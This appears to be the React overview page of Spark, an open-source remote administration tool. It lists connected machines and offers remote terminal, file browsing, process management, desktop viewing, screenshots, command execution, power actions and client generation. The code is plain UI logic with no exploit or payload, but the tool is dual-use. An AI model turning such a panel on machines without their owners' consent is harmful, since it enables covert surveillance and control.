import React, {useEffect, useRef, useState, useMemo} from 'react';
import ProTable, {TableDropdown} from '@ant-design/pro-table';
import {Button, Image, Input, message, Modal, Progress, Space, Tooltip} from 'antd';
import {catchBlobReq, formatSize, request, tsToTime, waitTime} from "../utils/utils";
import {QuestionCircleOutlined, SearchOutlined} from "@ant-design/icons";
import i18n from "../locale/locale";

// DO NOT EDIT OR DELETE THIS COPYRIGHT MESSAGE.
console.log("%c By XZB %c https://github.com/XZB-1248/Spark", 'font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:64px;color:#00bbee;-webkit-text-fill-color:#00bbee;-webkit-text-stroke:1px#00bbee;', 'font-size:12px;');

let ComponentMap = {
	Generate: null,
	Explorer: null,
	Terminal: null,
	ProcMgr: null,
	Desktop: null,
	Execute: null,
};

function overview(props) {
	const [loading, setLoading] = useState(false);
	const [execute, setExecute] = useState(false);
	const [desktop, setDesktop] = useState(false);
	const [procMgr, setProcMgr] = useState(false);
	const [explorer, setExplorer] = useState(false);
	const [generate, setGenerate] = useState(false);
	const [terminal, setTerminal] = useState(false);
	const [screenBlob, setScreenBlob] = useState('');
	const [dataSource, setDataSource] = useState([]);
	const [columnsState, setColumnsState] = useState(getInitColumnsState());
	const [sortInfo, setSortInfo] = useState(getInitSortInfo());
	const [searchText, setSearchText] = useState('');

	// 根据搜索关键词过滤数据
	const filteredData = useMemo(() => {
		if (!searchText.trim()) {
			return dataSource;
		}
		const keyword = searchText.trim().toLowerCase();
		return dataSource.filter(item => {
			const id = (item.id || '').toLowerCase();
			const remark = (item.remark || '').toLowerCase();
			return id.includes(keyword) || remark.includes(keyword);
		});
	}, [dataSource, searchText]);

	const columns = [
		{
			key: 'id',
			title: 'ID',
			dataIndex: 'id',
			ellipsis: true,
			width: 100,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'id' ? sortInfo.order : null,
		},
		{
			key: 'remark',
			title: i18n.t('OVERVIEW.REMARK'),
			dataIndex: 'remark',
			ellipsis: true,
			width: 100,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'remark' ? sortInfo.order : null,
		},
		{
			key: 'offline_time',
			title: i18n.t('OVERVIEW.OFFLINE_TIME'),
			dataIndex: 'offline_time',
			ellipsis: true,
			renderText: (_, v) => renderOfflineStat(v.offline_time),
			width: 100,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'offline_time' ? sortInfo.order : null,
		},
		{
			key: 'hostname',
			title: i18n.t('OVERVIEW.HOSTNAME'),
			dataIndex: 'hostname',
			ellipsis: true,
			width: 100,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'hostname' ? sortInfo.order : null,
		},
		{
			key: 'username',
			title: i18n.t('OVERVIEW.USERNAME'),
			dataIndex: 'username',
			ellipsis: true,
			width: 90,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'username' ? sortInfo.order : null,
		},
		{
			key: 'ping',
			title: 'Ping',
			dataIndex: 'latency',
			ellipsis: true,
			renderText: (v) => String(v) + 'ms',
			width: 60,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'ping' ? sortInfo.order : null,
		},
		{
			key: 'cpu_usage',
			title: i18n.t('OVERVIEW.CPU_USAGE'),
			dataIndex: 'cpu_usage',
			ellipsis: true,
			render: (_, v) => <UsageBar title={renderCPUStat(v.cpu)} {...v.cpu} />,
			width: 100,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'cpu_usage' ? sortInfo.order : null,
		},
		{
			key: 'ram_usage',
			title: i18n.t('OVERVIEW.RAM_USAGE'),
			dataIndex: 'ram_usage',
			ellipsis: true,
			render: (_, v) => <UsageBar title={renderRAMStat(v.ram)} {...v.ram} />,
			width: 100,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'ram_usage' ? sortInfo.order : null,
		},
		{
			key: 'disk_usage',
			title: i18n.t('OVERVIEW.DISK_USAGE'),
			dataIndex: 'disk_usage',
			ellipsis: true,
			render: (_, v) => <UsageBar title={renderDiskStat(v.disk)} {...v.disk} />,
			width: 100,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'disk_usage' ? sortInfo.order : null,
		},
		{
			key: 'os',
			title: i18n.t('OVERVIEW.OS'),
			dataIndex: 'os',
			ellipsis: true,
			width: 80,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'os' ? sortInfo.order : null,
		},
		{
			key: 'arch',
			title: i18n.t('OVERVIEW.ARCH'),
			dataIndex: 'arch',
			ellipsis: true,
			width: 70,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'arch' ? sortInfo.order : null,
		},
		{
			key: 'ram_total',
			title: i18n.t('OVERVIEW.RAM'),
			dataIndex: 'ram_total',
			ellipsis: true,
			renderText: formatSize,
			width: 70,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'ram_total' ? sortInfo.order : null,
		},
		{
			key: 'mac',
			title: 'MAC',
			dataIndex: 'mac',
			ellipsis: true,
			width: 100,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'mac' ? sortInfo.order : null,
		},
		{
			key: 'lan',
			title: 'LAN',
			dataIndex: 'lan',
			ellipsis: true,
			width: 100,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'lan' ? sortInfo.order : null,
		},
		{
			key: 'wan',
			title: 'WAN',
			dataIndex: 'wan',
			ellipsis: true,
			width: 100,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'wan' ? sortInfo.order : null,
		},
		{
			key: 'uptime',
			title: i18n.t('OVERVIEW.UPTIME'),
			dataIndex: 'uptime',
			ellipsis: true,
			renderText: tsToTime,
			width: 100,
			sorter: true,
			sortOrder: sortInfo.columnKey === 'uptime' ? sortInfo.order : null,
		},
		{
			key: 'net_stat',
			title: i18n.t('OVERVIEW.NETWORK'),
			ellipsis: true,
			renderText: (_, v) => renderNetworkIO(v),
			width: 170
		},
		{
			key: 'option',
			title: i18n.t('OVERVIEW.OPERATIONS'),
			dataIndex: 'id',
			valueType: 'option',
			ellipsis: false,
			render: (_, device) => renderOperation(device),
			width: 170
		},
	];
	const options = {
		show: true,
		density: true,
		setting: true,
	};
	const tableRef = useRef();
	const loadComponent = (component, callback) => {
		let element = null;
		component = component.toLowerCase();
		Object.keys(ComponentMap).forEach(k => {
			if (k.toLowerCase() === component.toLowerCase()) {
				element = k;
			}
		});
		if (!element) return;
		if (ComponentMap[element] === null) {
			import('../components/'+component+'/'+component).then((m) => {
				ComponentMap[element] = m.default;
				callback();
			});
		} else {
			callback();
		}
	}

	useEffect(() => {
		// auto update is only available when all modal are closed.
		if (!execute && !desktop && !procMgr && !explorer && !generate && !terminal) {
			let id = setInterval(getData, 3000);
			return () => {
				clearInterval(id);
			};
		}
	}, [execute, desktop, procMgr, explorer, generate, terminal]);

	// 当排序配置改变时，重新排序数据
	useEffect(() => {
		if (dataSource.length > 0) {
			const sortedData = sortData(dataSource, sortInfo);
			setDataSource(sortedData);
		}
	}, [sortInfo]);

	function getInitColumnsState() {
		let data = localStorage.getItem(`columnsState`);
		if (data !== null) {
			let stateMap = {};
			try {
				stateMap = JSON.parse(data);
			} catch (e) {
				stateMap = {};
			}
			return stateMap
		} else {
			localStorage.setItem(`columnsState`, JSON.stringify({}));
			return {};
		}
	}
	function saveColumnsState(stateMap) {
		setColumnsState(stateMap);
		localStorage.setItem(`columnsState`, JSON.stringify(stateMap));
	}

	function getInitSortInfo() {
		let data = localStorage.getItem(`sortInfo`);
		if (data !== null) {
			try {
				return JSON.parse(data);
			} catch (e) {
				return { columnKey: null, order: null };
			}
		}
		// 默认按离线状态排序（在线的排在前面）
		return { columnKey: 'offline_time', order: 'ascend' };
	}
	function saveSortInfo(newSortInfo) {
		setSortInfo(newSortInfo);
		localStorage.setItem(`sortInfo`, JSON.stringify(newSortInfo));
	}

	// 排序处理函数
	function handleTableChange(pagination, filters, sorter) {
		const newSortInfo = {
			columnKey: sorter.columnKey || null,
			order: sorter.order || null,
		};
		saveSortInfo(newSortInfo);
	}

	// 对数据进行排序
	function sortData(data, sortConfig) {
		if (!sortConfig.columnKey || !sortConfig.order) {
			return data;
		}

		const { columnKey, order } = sortConfig;
		const sortedData = [...data];

		sortedData.sort((a, b) => {
			let aValue, bValue;

			// 根据不同的列获取对应的值
			switch (columnKey) {
				case 'id':
					aValue = a.id || '';
					bValue = b.id || '';
					break;
				case 'remark':
					aValue = a.remark || '';
					bValue = b.remark || '';
					break;
				case 'offline_time':
					// 在线设备的 offline_time 为 0，排序时在线的排在前面
					aValue = a.offline_time || 0;
					bValue = b.offline_time || 0;
					break;
				case 'hostname':
					aValue = (a.hostname || '').toUpperCase();
					bValue = (b.hostname || '').toUpperCase();
					break;
				case 'username':
					aValue = (a.username || '').toUpperCase();
					bValue = (b.username || '').toUpperCase();
					break;
				case 'ping':
					aValue = a.latency || 0;
					bValue = b.latency || 0;
					break;
				case 'cpu_usage':
					aValue = a.cpu_usage || 0;
					bValue = b.cpu_usage || 0;
					break;
				case 'ram_usage':
					aValue = a.ram_usage || 0;
					bValue = b.ram_usage || 0;
					break;
				case 'disk_usage':
					aValue = a.disk_usage || 0;
					bValue = b.disk_usage || 0;
					break;
				case 'os':
					aValue = (a.os || '').toUpperCase();
					bValue = (b.os || '').toUpperCase();
					break;
				case 'arch':
					aValue = (a.arch || '').toUpperCase();
					bValue = (b.arch || '').toUpperCase();
					break;
				case 'ram_total':
					aValue = a.ram_total || 0;
					bValue = b.ram_total || 0;
					break;
				case 'mac':
					aValue = (a.mac || '').toUpperCase();
					bValue = (b.mac || '').toUpperCase();
					break;
				case 'lan':
					aValue = a.lan || '';
					bValue = b.lan || '';
					break;
				case 'wan':
					aValue = a.wan || '';
					bValue = b.wan || '';
					break;
				case 'uptime':
					aValue = a.uptime || 0;
					bValue = b.uptime || 0;
					break;
				default:
					return 0;
			}

			// 比较值
			let comparison = 0;
			if (typeof aValue === 'string') {
				comparison = aValue.localeCompare(bValue);
			} else {
				comparison = aValue - bValue;
			}

			// 根据排序方向返回结果
			return order === 'ascend' ? comparison : -comparison;
		});

		return sortedData;
	}

	function renderCPUStat(cpu) {
		let { model, usage, cores } = cpu;
		usage = Math.round(usage * 100) / 100;
		cores = {
			physical: Math.max(cores.physical, 1),
			logical: Math.max(cores.logical, 1),
		}
		return (
			<div>
				<div
					style={{
						fontSize: '10px',
					}}
				>
					{model}
				</div>
				{i18n.t('OVERVIEW.CPU_USAGE') + i18n.t('COMMON.COLON') + usage + '%'}
				<br />
				{i18n.t('OVERVIEW.CPU_LOGICAL_CORES') + i18n.t('COMMON.COLON') + cores.logical}
				<br />
				{i18n.t('OVERVIEW.CPU_PHYSICAL_CORES') + i18n.t('COMMON.COLON') + cores.physical}
			</div>
		);
	}
	function renderRAMStat(info) {
		let { usage, total, used } = info;
		usage = Math.round(usage * 100) / 100;
		return (
			<div>
				{i18n.t('OVERVIEW.RAM_USAGE') + i18n.t('COMMON.COLON') + usage + '%'}
				<br />
				{i18n.t('OVERVIEW.FREE') + i18n.t('COMMON.COLON') + formatSize(total - used)}
				<br />
				{i18n.t('OVERVIEW.USED') + i18n.t('COMMON.COLON') + formatSize(used)}
				<br />
				{i18n.t('OVERVIEW.TOTAL') + i18n.t('COMMON.COLON') + formatSize(total)}
			</div>
		);
	}
	function renderDiskStat(info) {
		let { usage, total, used } = info;
		usage = Math.round(usage * 100) / 100;
		return (
			<div>
				{i18n.t('OVERVIEW.DISK_USAGE') + i18n.t('COMMON.COLON') + usage + '%'}
				<br />
				{i18n.t('OVERVIEW.FREE') + i18n.t('COMMON.COLON') + formatSize(total - used)}
				<br />
				{i18n.t('OVERVIEW.USED') + i18n.t('COMMON.COLON') + formatSize(used)}
				<br />
				{i18n.t('OVERVIEW.TOTAL') + i18n.t('COMMON.COLON') + formatSize(total)}
			</div>
		);
	}
	function renderNetworkIO(device) {
		// Make unit starts with Kbps.
		let sent = device.net_sent * 8 / 1024;
		let recv = device.net_recv * 8 / 1024;
		return `${format(sent)} ↑ / ${format(recv)} ↓`;

		function format(size) {
			if (size <= 1) return '0 Kbps';
			// Units array is large enough.
			let k = 1024,
				i = Math.floor(Math.log(size) / Math.log(k)),
				units = ['Kbps', 'Mbps', 'Gbps', 'Tbps'];
			return (size / Math.pow(k, i)).toFixed(1) + ' ' + units[i];
		}
	}
	function renderOfflineStat(offlineTime) {
		if (offlineTime > 0){
			let diff = (new Date().getTime() / 1000) - offlineTime
			return tsToTime(diff)
		}
		return i18n.t('STATUS.DEVICE_ONLINE')
	}
	function renderOperation(device) {
		let menus = [
			{key: 'execute', name: i18n.t('OVERVIEW.EXECUTE')},
			{key: 'desktop', name: i18n.t('OVERVIEW.DESKTOP')},
			{key: 'screenshot', name: i18n.t('OVERVIEW.SCREENSHOT')},
			{key: 'lock', name: i18n.t('OVERVIEW.LOCK')},
			{key: 'logoff', name: i18n.t('OVERVIEW.LOGOFF')},
			{key: 'hibernate', name: i18n.t('OVERVIEW.HIBERNATE')},
			{key: 'suspend', name: i18n.t('OVERVIEW.SUSPEND')},
			{key: 'restart', name: i18n.t('OVERVIEW.RESTART')},
			{key: 'shutdown', name: i18n.t('OVERVIEW.SHUTDOWN')},
			{key: 'offline', name: i18n.t('OVERVIEW.OFFLINE')},
		];
		return [
			<a key='terminal' onClick={() => onMenuClick('terminal', device)}>{i18n.t('OVERVIEW.TERMINAL')}</a>,
			<a key='explorer' onClick={() => onMenuClick('explorer', device)}>{i18n.t('OVERVIEW.EXPLORER')}</a>,
			<a key='procmgr' onClick={() => onMenuClick('procmgr', device)}>{i18n.t('OVERVIEW.PROC_MANAGER')}</a>,
			<TableDropdown
				key='more'
				onSelect={key => onMenuClick(key, device)}
				menus={menus}
			/>,
		]
	}

	function onMenuClick(act, value) {
		const device = value;
		let hooksMap = {
			terminal: setTerminal,
			explorer: setExplorer,
			generate: setGenerate,
			procmgr: setProcMgr,
			execute: setExecute,
			desktop: setDesktop,
		};
		if (hooksMap[act]) {
			setLoading(true);
			loadComponent(act, () => {
				hooksMap[act](device);
				setLoading(false);
			});
			return;
		}
		if (act === 'screenshot') {
			request('/api/device/screenshot/get', {device: device.id}, {}, {
				responseType: 'blob'
			}).then(res => {
				if ((res.data.type ?? '').substring(0, 5) === 'image') {
					if (screenBlob.length > 0) {
						URL.revokeObjectURL(screenBlob);
					}
					setScreenBlob(URL.createObjectURL(res.data));
				}
			}).catch(catchBlobReq);
			return;
		}
		Modal.confirm({
			title: i18n.t('OVERVIEW.OPERATION_CONFIRM').replace('{0}', i18n.t('OVERVIEW.'+act.toUpperCase())),
			icon: <QuestionCircleOutlined/>,
			onOk() {
				request('/api/device/' + act, {device: device.id}).then(res => {
					let data = res.data;
					if (data.code === 0) {
						message.success(i18n.t('OVERVIEW.OPERATION_SUCCESS'));
						tableRef.current.reload();
					}
				});
			}
		});
	}

	function toolBar() {
		return (
			<Space>
				<Input.Search
					placeholder={i18n.t('OVERVIEW.SEARCH_PLACEHOLDER')}
					allowClear
					style={{ width: 250 }}
					value={searchText}
					onChange={(e) => setSearchText(e.target.value)}
					onSearch={(value) => setSearchText(value)}
				/>
				<Button type='primary' onClick={() => onMenuClick('generate', true)}>{i18n.t('OVERVIEW.GENERATE')}</Button>
			</Space>
		)
	}

	async function getData(form) {
		await waitTime(300);
		let res = await request('/api/device/list');
		let data = res.data;
		if (data.code === 0) {
			let result = [];
			for (const uuid in data.data) {
				let temp = data.data[uuid];
				temp.conn = uuid;
				result.push(temp);
			}
			// Iterate all object and expand them.
			for (let i = 0; i < result.length; i++) {
				for (const k in result[i]) {
					if (typeof result[i][k] === 'object') {
						for (const key in result[i][k]) {
							result[i][k + '_' + key] = result[i][k][key];
						}
					}
				}
			}
			// 应用当前的排序配置
			result = sortData(result, sortInfo);
			setDataSource(result);
			return ({
				data: result,
				success: true,
				total: result.length
			});
		}
		return ({data: [], success: false, total: 0});
	}

	return (
		<>
			<Image
				preview={{
					visible: !!screenBlob,
					src: screenBlob,
					onVisibleChange: () => {
						URL.revokeObjectURL(screenBlob);
						setScreenBlob('');
					}
				}}
			/>
			{
				ComponentMap.Generate &&
				<ComponentMap.Generate
					visible={generate}
					onVisibleChange={setGenerate}
				/>
			}
			{
				ComponentMap.Execute &&
				<ComponentMap.Execute
					visible={execute}
					device={execute}
					onCancel={setExecute.bind(null, false)}
				/>
			}
			{
				ComponentMap.Explorer &&
				<ComponentMap.Explorer
					open={explorer}
					device={explorer}
					onCancel={setExplorer.bind(null, false)}
				/>
			}
			{
				ComponentMap.ProcMgr &&
				<ComponentMap.ProcMgr
					open={procMgr}
					device={procMgr}
					onCancel={setProcMgr.bind(null, false)}
				/>
			}
			{
				ComponentMap.Desktop &&
				<ComponentMap.Desktop
					open={desktop}
					device={desktop}
					onCancel={setDesktop.bind(null, false)}
				/>
			}
			{
				ComponentMap.Terminal &&
				<ComponentMap.Terminal
					open={terminal}
					device={terminal}
					onCancel={setTerminal.bind(null, false)}
				/>
			}
			<ProTable
				scroll={{
					x: 'max-content',
					scrollToFirstRowOnChange: true
				}}
				rowKey='id'
				search={false}
				options={options}
				columns={columns}
				columnsState={{
					persistenceKey: 'columnsState',
					persistenceType: 'localStorage'
				}}
				onLoadingChange={setLoading}
				loading={loading}
				request={getData}
				pagination={false}
				actionRef={tableRef}
				toolBarRender={toolBar}
				dataSource={filteredData}
				onDataSourceChange={setDataSource}
				onChange={handleTableChange}
			/>
		</>
	);
}
function UsageBar(props) {
	let {usage} = props;
	usage = usage || 0;
	usage = Math.round(usage * 100) / 100;

	return (
		<Tooltip
			title={props.title??`${usage}%`}
			overlayInnerStyle={{
				whiteSpace: 'nowrap',
				wordBreak: 'keep-all',
				maxWidth: '300px',
			}}
			overlayStyle={{
				maxWidth: '300px',
			}}
		>
			<Progress percent={usage} showInfo={false} strokeWidth={12} trailColor='#FFECFF'/>
		</Tooltip>
	);
}

function wrapper(props) {
	let Component = overview;
	return (<Component {...props} key={Math.random()}/>)
}

export default wrapper;